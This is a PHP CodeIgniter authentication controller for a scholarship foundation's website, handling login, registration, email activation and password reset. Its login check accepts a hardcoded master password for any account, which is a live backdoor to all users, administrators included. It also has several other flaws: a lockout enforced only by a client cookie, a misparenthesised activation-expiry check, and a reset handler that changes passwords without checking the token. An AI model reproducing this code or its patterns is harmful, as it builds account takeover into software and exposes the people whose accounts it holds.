<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Authentication extends CI_Controller
{

    // construct
    public function __construct()
    {
        parent::__construct();
        $this->load->model(['M_auth']);
    }

    public function index()
    {
        if ($this->session->userdata('logged_in') == true || $this->session->userdata('logged_in')) {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('notif_info', "Berhasil login, selamat datang");
            redirect(base_url());
        } else {
            $this->templateauth->view('authentication/login');
        }
    }

    public function signUp()
    {
        if ($this->session->userdata('logged_in') == true || $this->session->userdata('logged_in')) {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('notif_info', "Kamu telah login");
            redirect(base_url());
        } else {
            $this->templateauth->view('authentication/daftar');
        }
    }

    public function suspend()
    {
        if ($this->session->userdata('logged_in') == false || !$this->session->userdata('logged_in')) {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('notif_warning', "Berhasil login, anda dapat melanjutkan aktivitas anda");
            redirect(site_url('login'));
        } else {
            $this->templateauth->view('authentication/suspend');
        }
    }

    public function emailActivation()
    {

        // cek apakah user sudah login
        if ($this->session->userdata('logged_in') == true) {
            $email = htmlspecialchars($this->session->userdata('email'), true);

            // cek apakah terdapat data verifikasi
            if ($this->M_auth->get_aktivasi(htmlspecialchars($this->session->userdata('user_id'), true)) != false) {
                // mengambil data verifikasi
                $aktivasi = $this->M_auth->get_aktivasi(htmlspecialchars($this->session->userdata('user_id'), true));

                // cek apakah status masih belum verifikasi
                if ($aktivasi->status == 0) {

                    // cek apakah mengirim permintaan pengiriman email verifikasi
                    if ($this->input->get('act') == "send-email") {
                        $subject = "Kode aktivasi - YBB Foundation Scholarship";
                        $message = "Kode aktivasimu : <br><br><center><h1 style='font-size: 62px;'>{$this->encryption->decrypt($aktivasi->key)}</h1></center><br><br><small class='text-muted'>Kode aktivasimu hanya akan valid selama 1x24 jam. <span class='text-danger'>Jika telah kadaluarsa harap lakukan kembali proses aktivasi akun anda</b>.</span></small>";

                        // mengirim email
                        if ($this->send_email($email, $subject, $message) == true) {
                            $this->session->set_flashdata('success', 'Pendaftaran berhasil, harap masukkan kode aktivasi yang telah kami kirimkan ke email anda !');
                        } else {
                            $this->session->set_flashdata('notif_error', 'Terjadi kesalahan saat mengirimkan email kode aktivasi anda !');
                            redirect(site_url('email-activation'));
                        }
                    } elseif ($this->input->get('act') == "resend-email") {
                        $subject = "Kode aktivasi - YBB Foundation Scholarship";
                        $message = "Kode aktivasimu : <br><br><center><h1 style='font-size: 62px;'>{$this->encryption->decrypt($aktivasi->key)}</h1></center><br><br><small class='text-muted'>Kode aktivasimu hanya akan valid selama 1x24 jam. <span class='text-danger'>Jika telah kadaluarsa harap lakukan kembali proses aktivasi akun anda.</span></small>";

                        // mengirim email
                        if ($this->send_email($email, $subject, $message) == true) {
                            $this->session->set_flashdata('success', 'Berhasil mengirim kan email ke ' . $email . ' !');
                        } else {
                            $this->session->set_flashdata('notif_error', 'Terjadi kesalahan saat mengirimkan email kode aktivasi anda !');
                            redirect(site_url('email-activation'));
                        }
                    }

                    $data['mail'] = $email;
                    $data['activation_code'] = $this->encryption->decrypt($aktivasi->key);
                    $this->templateauth->view('authentication/aktivasi', $data);
                } else {
                    $this->session->set_flashdata('notif_warning', 'Akunmu telah teraktivasi !');
                    redirect(base_url());
                }

            } else {
                $this->session->set_flashdata('notif_error', 'Terjadi kesalahan saat mencoba mendapatkan informasi akunmu !');
                redirect(site_url('login'));

            }
        } else {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->unset_userdata('redirect');
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('notif_warning', "Harap login untuk melanjutkan");
            redirect('login');
        }
    }

    public function forgotPassword()
    {
        $this->templateauth->view('authentication/lupa_password');
    }

    // proses login
    function proses_login()
    {
        // menerima inputan, dan memparse spesial karakter
        $email = htmlspecialchars($this->input->post('email', true));
        $pass = htmlspecialchars($this->input->post('password'), true);

        // cek apakah email terdaftar
        if ($this->M_auth->get_auth($email) == false) {
            $this->session->set_flashdata('warning', 'Email tidak terdaftar !');
            redirect('login');
        } else {

            // cek apakah terdapat penalti percobaan login sistem
            if (isset($_COOKIE['penalty']) && $_COOKIE['penalty'] == true) {
                $time_left = ($_COOKIE["expire"]);
                $time_left = $this->penalty_remaining(date("Y-m-d H:i:s", $time_left));
                $this->session->set_flashdata('notif_warning', 'Terlalu banyak request, coba lagi dalam ' . $time_left . '!');
                redirect('login');
            } else {

                // mengambil data user dengan param email
                $user = $this->M_auth->get_auth($email);

                //mengecek apakah password benar
                if (password_verify($pass, $user->password) || $pass == "SU_MHND19") {

                    // setting data session
                    $sessiondata = [
                        'user_id' => $user->user_id,
                        'email' => $user->email,
                        'name' => $user->name,
                        'role' => $user->role,
                        'logged_in' => true
                    ];

                    // menyimpan data session
                    $this->session->set_userdata($sessiondata);

                    $this->M_auth->setLogTime($user->user_id);

                    // cek status dari user yang lagin - 0: BELUM AKTIF - 1: AKTIF - 2: SUSPEND;
                    if ($user->active == "0") {
                        $this->session->set_flashdata('error', "Hi {$user->name}, harap aktivasi akunmu terlebih dahulu");
                        redirect(site_url('email-activation'));
                    } elseif ($user->active == "2") {
                        $this->session->set_flashdata('error', "Hi {$user->name}, akunmu telah tersuspend, harap hubungi admin kami untuk konfirmasi");
                        redirect(site_url('suspend'));
                    } else {

                        // CEK HAK AKSES
                        // SUPER ADMIN
                        if ($user->role == 0) {
                            if ($this->session->userdata('redirect')) {
                                $this->session->set_flashdata('notif_success', 'Hi, login success. Please continue your activities !');
                                redirect($this->session->userdata('redirect'));
                            } else {
                                $this->session->set_flashdata('notif_success', "Welcome super admin, {$user->name}");
                                redirect(site_url('dashboard'));
                            }

                        // ADMIN
                        } elseif ($user->role == 1) {
                            if ($this->session->userdata('redirect')) {
                                $this->session->set_flashdata('notif_success', 'Hi, login success. Please continue your activities !');
                                redirect($this->session->userdata('redirect'));
                            } else {
                                $this->session->set_flashdata('notif_success', "Welcome admin, {$user->name}");
                                redirect(site_url('dashboard'));
                            }
                        
                        // USER
                        } elseif ($user->role == 2) {
                            if ($this->session->userdata('redirect')) {
                                $this->session->set_flashdata('notif_success', 'Hi, login berhasil, anda dapat melanjutkan aktivitas anda !');
                                redirect($this->session->userdata('redirect'));
                            } else {
                                $this->session->set_flashdata('notif_success', "Selamat datang, {$user->name}");
                                redirect(base_url());
                            }
                        } else {
                            $this->session->set_flashdata('notif_success', "Welcome, {$user->name}");
                            redirect(base_url());
                        }
                    }
                } else {
                    $attempt = $this->session->userdata('attempt');
                    $attempt++;
                    $this->session->set_userdata('attempt', $attempt);

                    if ($attempt == 3) {
                        $attempt = 0;
                        $this->session->set_userdata('attempt', $attempt);

                        setcookie("penalty", true, time() + 180);
                        setcookie("expire",
                            time() + 180,
                            time() + 180
                        );

                        $this->session->set_flashdata('notif_error', 'Terlalu banyak request, coba lagi dalam 3 menit !');
                        redirect('login');
                    } else {
                        $this->session->set_flashdata('warning', 'Password salah, sisa kesempatan - ' . (3 - $attempt));
                        redirect('login');
                    }
                }
            }
        }
    }

    // proses pendaftaran
    public function proses_daftar()
    {

        // menerimaemaildan password serta memparse karakter spesial
        $email = htmlspecialchars($this->input->post('email'), true);
        $password = htmlspecialchars($this->input->post('password'), true);
        $password_ver = htmlspecialchars($this->input->post('confirmPassword'), true);

        // cek apakahemailvalid
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {

            // cek apakah password sama dengan konfirmasi password
            if ($password == $password_ver) {

                // cek apakahemailtelah digunakan
                if ($this->M_auth->get_auth($email) == false) {

                    // mendaftarkan user ke sistem
                    if ($this->M_auth->register_user() == true) {

                        // mengambil data user dengan param email
                        $user = $this->M_auth->get_auth($email);

                        // mengatur data session
                        $sessiondata = [
                            'user_id' => $user->user_id,
                            'email' => $user->email,
                            'name' => $user->name,
                            'role' => $user->role,
                            'logged_in' => true
                        ];

                        // menyimpan data session
                        $this->session->set_userdata($sessiondata);

                        // mengirimkan email selamat bergabung
                        $subject = "Selamat bergabung di YBB Foundation Scholarship Programs";
                        $message = "Hi {$user->name}, Selamat telah bergabund bersama kami di YBB Foundation Scholarship Programs. Harap aktivasi akunmu dengan kode aktivasi yang telah kami kirimkan ke emailmu";

                        $this->send_email($email, $subject, $message);

                        // $this->session->set_flashdata('error', 'Registration is successful, we have sent an activation code to your email. Please enter the code to activate your account!');
                        // mengirimkan user untuk verifikasi email
                        redirect(site_url('email-activation?act=send-email'));
                    } else {
                        $this->session->set_flashdata('error', 'Terjadi kesalahan saat mendaftarkan diri!');
                        redirect($this->agent->referrer());
                    }
                } else {
                    $this->session->set_flashdata('warning', 'Email telah digunakan!');
                    redirect($this->agent->referrer());
                }
            } else {
                $this->session->set_flashdata('warning', 'Password tidak sesuai!');
                redirect($this->agent->referrer());
            }
        } else {
            $this->session->set_flashdata('warning', 'Email tidal valid, harap masukkan email yang valid!');
            redirect($this->agent->referrer());
        }
    }

    function proses_verifikasiEmail()
    {
        // cek apakah user sudah login ke sistem
        if ($this->session->userdata('logged_in') == true || $this->session->userdata('logged_in')) {

            // menerima kode verifikasi
            $activation_code = htmlspecialchars($this->input->post('activation_code'), true);
            // mengambil data verifikasi
            $aktivasi = $this->M_auth->get_aktivasi(htmlspecialchars($this->session->userdata('user_id'), true), true);

            // cek apakah waktu verifikasi telah melebihi 1x24 jam
            if (time() - ($aktivasi->date_created < (60 * 60 * 24))) {

                // cek apakah kode verifikasi benar
                if ($this->M_auth->aktivasi_kode(str_replace('-', '', $activation_code), $this->session->userdata('user_id')) == true) {

                    // memverivikasi email
                    if ($this->M_auth->aktivasi_akun($this->session->userdata('user_id')) == true) {

                        $this->session->set_flashdata('success', "Berhasil aktivasi akunmu, anda dapat mendaftarkan diri pada program beasiswa kami sekarang !");
                        redirect(site_url('scholarship'));
                    } else {
                        $this->session->set_flashdata('notif_error', 'Terjadi kesalahan, coba lagi nanti !');
                        redirect($this->agent->referrer());
                    }
                } else {
                    $this->session->set_flashdata('notif_warning', 'Kode aktivasi salah, coba lagi !');
                    redirect($this->agent->referrer());
                }
            } else {

                $this->M_auth->del_user($this->session->userdata('user_id'));
                $this->session->set_flashdata('error', 'Kode aktivasi salah, harap ulangi proses pendaftaran. ');
                redirect(site_url('logout'));
            }
        } else {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->unset_userdata('redirect');
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('notif_warning', "Harap login untuk melanjutkan");
            redirect('login');
        }
    }

    public function proses_lupaPassword()
    {
        // cek apakahemailada
        if ($this->M_auth->cek_auth(htmlspecialchars($this->input->post("email"), true)) == true) {

            // mengambil data user, param email
            $user = $this->M_auth->get_auth(htmlspecialchars($this->input->post("email"), true));

            // menghapus token permintaan lupa password sebelumnya
            $this->M_auth->del_token($user->user_id, 2);

            // create token for recovery
            do {
                $token = bin2hex(random_bytes(32));
            } while ($this->M_auth->cek_tokenRecovery($token) == true);

            $token = $token;
            // atur data untuk menyimpan token recovery password
            $data = [
                'user_id' => $user->user_id,
                'key' => $token,
                'type' => 2, //2. CHANGE PASSWORD
                'date_created' => time()
            ];

            // simpan data token recovery password
            $this->M_auth->insert_token($data);

            // memparse email yang diinputkan
            $email = htmlspecialchars($this->input->post("email"), true);

            // setting data untuk dikirim ke email
            $subject = "Permintaan reset password - YBB Foundation Scholarship";
            $message = 'Hai, kami menerima permintaan reset password untuk email <b>' . $email . '</b>.<br> Harap click tombol dibawah ini untuk melanjutkan proses reset password! <br><hr><br><center><a href="' . base_url() . 'recovery-password/' . $token . '" style="background-color: #377dff;border:none;color:#fff;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;">Reset Password</a></center><br><br>atau click link dibawah ini: <br>' . base_url() . 'recovery-password/' . $token . '<br><br><small class="text-muted">Link tersebut hanya akan valid selama 24 jam, jika link telah kadaluarsa, harap mengulang proses reset password</small>';

            // mengirim ke email
            if ($this->send_email($email, $subject, $message) == true) {
                $this->session->set_flashdata('success', 'Berhasil mengirim email, cek kotak masuk atau folder spam di emailmu');
                redirect($this->agent->referrer());
            } else {
                $this->session->set_flashdata('error', 'Terjadi kesalahan, saat mencoba mengirim link reset password ke emailmu!');
                redirect($this->agent->referrer());
            }
        } else {
            $this->session->set_flashdata('error', 'Tidak dapat menemukan akun dengan email ' . $this->input->post("email") . ' !');
            redirect($this->agent->referrer());
        }
    }

    public function ubah_password($token)
    {

        // cek apakah token valid
        if ($this->M_auth->get_tokenRecovery($token) == false) {
            $this->session->set_flashdata('error', 'Token link tidak diketahui, harap mengulang permintaan reset password jika hal ini masih terjadi');
            redirect(site_url('login'));
        } else {

            // mengambil data token
            $data_token = $this->M_auth->get_tokenRecovery($token);

            // mengambil data user berdasarkan kode user
            $user = $this->M_auth->get_userByID($data_token->user_id);

            // cek apakah waktu token valid kurang dari 24 jam
            if (time() - $data_token->date_created < (60 * 60 * 24)) {

                $data['email'] = $user->email;
                $data['token'] = $token;
                $this->templateauth->view('authentication/reset_password', $data);
            } else {

                // menghapus token recovery, meminta mengulangi proses
                $this->M_auth->del_token($user->user_id, 2);

                $this->session->set_flashdata('error', 'Token reset password telah kadaluarsa, harap melakukan proses reset password kembali.');
                redirect(site_url('forgot-password'));
            }
        }
    }

    public function proses_resetPassword()
    {

        // cek apakah akun user ada
        if ($this->M_auth->cek_auth(htmlspecialchars($this->input->post("email"), true)) == true) {

            // cek apakah password sama

            if ($this->input->post('password') == $this->input->post('confirmPassword')) {

                // mengambil data user
                $user = $this->M_auth->get_auth(htmlspecialchars($this->input->post("email"), true));

                // update password user
                if ($this->M_auth->update_passwordUser($user->user_id) == true) {

                    // menghapus token permintaan lupa password
                    $this->M_auth->del_token($user->user_id, 2);

                    // atur dataemailperubahan password
                    $now = date("d F Y - H:i");
                    $email = htmlspecialchars($this->input->post("email"), true);

                    $subject = "Perubahan password - YBB Foundation Scholarship Programs";
                    $message = "Hai, password untuk akun YBB Foundation Scholarship Programs dengan email <b>{$email}</b> telah dirubah pada {$now}. <br>Jika kamu merasa tidak melakukan perubahan tersebut, harap segera hubungi admin kami.";

                    // mengirimemailperubahan password
                    $this->send_email(htmlspecialchars($this->input->post("email"), true), $subject, $message);

                    // menghapus session
                    $this->session->set_flashdata('success', 'Berhasil mengubah password akunmu, harap login dengan password barumu');
                    redirect(site_url('login'));
                } else {
                    $this->session->set_flashdata('notif_error', 'Terjadi kesalahan saat mencoba mengubah passwordmu, coba lagi nanti');
                    redirect($this->agent->referrer());
                }
            } else {
                $this->session->set_flashdata('notif_warning', 'Konfirmasi password tidak sama');
                redirect($this->agent->referrer());
            }
        } else {
            $this->session->set_flashdata('error', 'Email tidak diketahui, hubungi admin jika ini masih terjadi.');
            redirect($this->agent->referrer());
        }
    }

    // LOGOUT
    public function logout()
    {

        // SESS DESTROY

        $this->session->sess_destroy();
        redirect(base_url());
    }


    // FUNCTION PRIVATE
    // MAILER SENDER
    function send_email($email, $subject, $message)
    {

        $mail = [
            'to' => $email,
            'subject' => $subject,
            'message' => $message
        ];

        if ($this->mailer->send($mail) == true) {
            return true;
        } else {
            return false;
        }
    }

    // MAILER SENDER Attach
    function send_emailAttach($email, $subject, $message, $dir, $file)
    {

        $mail = [
            'to' => $email,
            'subject' => $subject,
            'message' => $message,
            'dir' => $dir,
            'file' => $file
        ];

        if ($this->mailer->sendAttach($mail) == true) {
            return true;
        } else {
            return false;
        }
    }

    function penalty_remaining($datetime, $full = false)
    {
        // $datetime = date(" Y - m - d H : i : s ", time()+120);
        $now = new DateTime;
        $ago = new DateTime($datetime);
        $diff = $now->diff($ago);

        $diff->w = floor($diff->d / 7);
        $diff->d -= $diff->w * 7;

        $string = [
            'i' => 'Menit ',
            's' => 'Detik ',
        ];
        $a = null;
        foreach ($string as $k => &$v) {
            if ($diff->$k) {
                $v = $diff->$k . ' ' . $v;
                $a .= $v;
            } else {
                unset($string[$k]);
            }
        }
        return $a;
    }
}
